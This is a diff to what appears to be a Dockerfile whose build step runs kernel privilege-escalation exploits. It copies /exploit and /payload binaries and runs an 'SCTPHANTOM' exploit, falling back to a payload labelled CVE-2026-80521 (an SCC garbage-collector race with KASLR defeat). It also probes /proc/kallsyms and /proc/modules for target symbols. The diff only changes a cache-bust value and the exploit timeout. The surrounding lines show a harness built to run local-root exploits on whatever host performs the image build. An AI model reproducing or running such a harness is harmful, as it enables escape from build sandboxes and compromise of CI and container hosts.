@@ -7,7 +7,7 @@ COPY payload /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
-ARG CACHEBUST=1304
+ARG CACHEBUST=1305
 RUN sh -c '{ \
 echo "CB=$CACHEBUST"; \
 KVER=$(uname -r); \
@@ -21,7 +21,7 @@ case "$KVER" in \
     echo "=== SCTPHANTOM EXIT=$EC_SCTP ==="; \
     if [ "$EC_SCTP" != "0" ]; then \
       echo "--- FALLBACK: CVE-2026-80521 (SCC GC race, plurality KASLR) ---"; \
-      timeout 600 /payload 2>&1; \
+      timeout 420 /payload 2>&1; \
       EC=$?; \
       echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
     fi; \
@@ -32,7 +32,7 @@ case "$KVER" in \
     grep sctp /proc/modules 2>/dev/null && echo "SCTP_MODULE=loaded" || echo "SCTP_MODULE=absent"; \
     grep unix_walk_scc /proc/kallsyms 2>/dev/null | head -1 && echo "SCC_GC=present" || echo "SCC_GC=absent"; \
     echo "--- CVE-2026-80521 (SCC GC race) ---"; \
-    timeout 600 /payload 2>&1; \
+    timeout 420 /payload 2>&1; \
     EC=$?; \
     echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
     ;; \
